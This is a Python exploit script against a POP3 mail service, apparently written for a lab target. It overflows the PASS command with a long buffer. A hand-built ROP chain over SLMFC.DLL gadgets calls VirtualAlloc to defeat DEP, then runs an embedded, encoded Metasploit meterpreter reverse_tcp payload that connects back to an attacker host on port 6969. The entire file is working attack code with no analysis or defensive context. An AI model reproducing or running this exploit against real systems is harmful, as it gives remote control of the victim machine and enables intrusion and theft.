import sys
import socket
import struct

def create_rop_chain():
                rop_gadgets = [
                  # Put a valid pointer on EAX
                  0x5f48c086,       # MOV EAX,ECX # RETN
                  #--- Save ESP into ECX
                  0x5f42F7dc,       # PUSH ESP # INC ESI # ADD DWORD PTR DS:[EAX],EAX # POP ECX # MOV EAX,ESI # POP ESI # RETN 0x04
                  0x41414141,      # to pop esi
                  0x5f4011f2,        # RET
                  0x41414141,      # compensate retn 0x04
                  # Ptr to VirtualAlloc on EAX
                  0x5f418fac,         # POP EAX # RETN
                  0x5f49a1cc,        # PTR to kernel32.dll
                  0x5f488461,       # MOV EAX,DWORD PTR DS:[EAX] # RETN 0x04
                  0x5f4011f2,        # RET
                  0x41414141,      # Compensate for the Retn 0x04
                  0x5f445803,       # POP EDI # RETN
                  0xffffff28,            # Offset to VirtualAlloc -0xd8
                  0x5f46e759,       # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
                  0x41414141,      # Filler to POP EDI
                  # Save the pointer to VirtualAlloc
                  0x5f440377,   # MOV DWORD PTR DS:[ECX],EAX # RETN 0x08
                  0x5f4011f2,        # RET
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # returnTo (Address where VirtualAlloc returns: must be behind the rop_chain)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFEC0,      # Value to EAX (-0x140)
                  0x5f465969,       # NEG EAX # RETN
                  0x5f425151,       # PUSH ECX # INC EDX # POP EDI # RETN
                  0x5f46e759,       # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
                  0x41414141,      # Filler to POP EDI
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  # Save returnTo
                  0x5f440377,   # MOV DWORD PTR DS:[ECX],EAX # RETN 0x08
                  0x5f4011f2,        # RET
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # lpAddress (Address where start the DEP disabled)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFDBE,     # Value to EAX (-578 bytes (0x242))
                  0x5f425151,       # PUSH ECX # INC EDX # POP EDI # RETN
                  0x5f46e759,       # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN
                  0x41414141,      # Filler to POP EDI
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f440377,   # MOV DWORD PTR DS:[ECX],EAX # RETN 0x08
                  0x5f4298a4,       # INC ECX # RETN
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # dwSize (0x1FF)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFE01,      # Value to EAX (-0x1FF)
                  0x5f465969,       # NEG EAX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f440377,   # MOV DWORD PTR DS:[ECX],EAX # RETN 0x08
                  0x5f4298a4,       # INC ECX # RETN
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # flAllocationType (0x1000)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFF001,      # -0xFFF  (-0x1000 contains null bytes)
                  0x5f465969,       # NEG EAX # RETN
                  0x5f4235b6,       # INC EAX # RETN (0xFFF + 1 = 0x1000)
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f440377,   # MOV DWORD PTR DS:[ECX],EAX # RETN 0x08
                  0x5f4298a4,       # INC ECX # RETN
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # flProtect (0x40)
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFFC0,      # -0x40 
                  0x5f465969,       # NEG EAX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f4298a4,       # INC ECX # RETN
                  0x5f440377,   # MOV DWORD PTR DS:[ECX],EAX # RETN 0x08
                  0x5f4011f2,        # RET
                  0x41414141,      # Compensate for the Retn 0x08
                  0x41414141,      # Compensate for the Retn 0x08
                  # Make ESP point to VirtualAlloc pointer on stack and RET
                  0x5f418fac,         # POP EAX # RETN
                  0xFFFFFFEC,      # -0x14 (value to substract to ECX)
                  0x5f425151,       # PUSH ECX # INC EDX # POP EDI # RETN (move ecx to edi)
                  0x5f46e759,       # ADD EAX,EDI # TEST AL,49 # POP EDI # RETN (On eax is the pointer to VirtualAlloc)
                  0x41414141,      # Filler to POP EDI
                  0x5f452c0f,        # XCHG EAX,ESP # RETN
                ]
                return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.65.178 LPORT=6969 EXITFUNC=thread -b \x00\x0a\x0d -f c
# x86/shikata_ga_nai succeeded with size 347 (iteration=0)
shellcode=(
        "\xd9\xc9\xd9\x74\x24\xf4\x5e\xbb\xf7\xb6\x29\xfa\x31\xc9\xb1"
"\x53\x31\x5e\x17\x03\x5e\x17\x83\x19\x4a\xcb\x0f\x19\x5b\x8e"
"\xf0\xe1\x9c\xef\x79\x04\xad\x2f\x1d\x4d\x9e\x9f\x55\x03\x13"
"\x6b\x3b\xb7\xa0\x19\x94\xb8\x01\x97\xc2\xf7\x92\x84\x37\x96"
"\x10\xd7\x6b\x78\x28\x18\x7e\x79\x6d\x45\x73\x2b\x26\x01\x26"
"\xdb\x43\x5f\xfb\x50\x1f\x71\x7b\x85\xe8\x70\xaa\x18\x62\x2b"
"\x6c\x9b\xa7\x47\x25\x83\xa4\x62\xff\x38\x1e\x18\xfe\xe8\x6e"
"\xe1\xad\xd5\x5e\x10\xaf\x12\x58\xcb\xda\x6a\x9a\x76\xdd\xa9"
"\xe0\xac\x68\x29\x42\x26\xca\x95\x72\xeb\x8d\x5e\x78\x40\xd9"
"\x38\x9d\x57\x0e\x33\x99\xdc\xb1\x93\x2b\xa6\x95\x37\x77\x7c"
"\xb7\x6e\xdd\xd3\xc8\x70\xbe\x8c\x6c\xfb\x53\xd8\x1c\xa6\x3b"
"\x2d\x2d\x58\xbc\x39\x26\x2b\x8e\xe6\x9c\xa3\xa2\x6f\x3b\x34"
"\xc4\x45\xfb\xaa\x3b\x66\xfc\xe3\xff\x32\xac\x9b\xd6\x3a\x27"
"\x5b\xd6\xee\xd2\x53\x71\x41\xc1\x9e\xc1\x31\x45\x30\xaa\x5b"
"\x4a\x6f\xca\x63\x80\x18\x63\x9e\x2b\x37\x28\x17\xcd\x5d\xc0"
"\x71\x45\xc9\x22\xa6\x5e\x6e\x5c\x8c\xf6\x18\x15\xc6\xc1\x27"
"\xa6\xcc\x65\xbf\x2d\x03\xb2\xde\x31\x0e\x92\xb7\xa6\xc4\x73"
"\xfa\x57\xd8\x59\x6c\xfb\x4b\x06\x6c\x72\x70\x91\x3b\xd3\x46"
"\xe8\xa9\xc9\xf1\x42\xcf\x13\x67\xac\x4b\xc8\x54\x33\x52\x9d"
"\xe1\x17\x44\x5b\xe9\x13\x30\x33\xbc\xcd\xee\xf5\x16\xbc\x58"
"\xac\xc5\x16\x0c\x29\x26\xa9\x4a\x36\x63\x5f\xb2\x87\xda\x26"
"\xcd\x28\x8b\xae\xb6\x54\x2b\x50\x6d\xdd\x4b\xb3\xa7\x28\xe4"
"\x6a\x22\x91\x69\x8d\x99\xd6\x97\x0e\x2b\xa7\x63\x0e\x5e\xa2"
"\x28\x88\xb3\xde\x21\x7d\xb3\x4d\x41\x54"
        ) 
#0x5f4011f2 : # RET                          [SLMFC.DLL]
EIP=struct.pack("<L",0x5f4011f2)
move_esp = "\x81\xc4\xc0\xfb\xff\xff" # add esp,-440h
jmp_back = "\xe9\x7d\xfc\xff\xff" # jmp $-37E

eip_offset = 4654
shellcode_offset = 4092

shellcode_size = 562
buff_size = 6000

rop_chain = create_rop_chain()

buffer = 'A' * shellcode_offset
buffer += move_esp
buffer += shellcode
buffer += 'B' * (eip_offset - len(buffer)) # Here is where the real shellcode goes
buffer += EIP
buffer += rop_chain
buffer += jmp_back
buffer += 'C' * (buff_size - len(buffer))

print (str(len(rop_chain)))

HOST = '172.20.0.114'
PORT = 110

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(1024)
print 'Received', repr(data)
s.send('USER username'+'\r\n')
data = s.recv(1024)
print 'Received', repr(data)
s.send('PASS ' + buffer + '\r\n')
s.close()
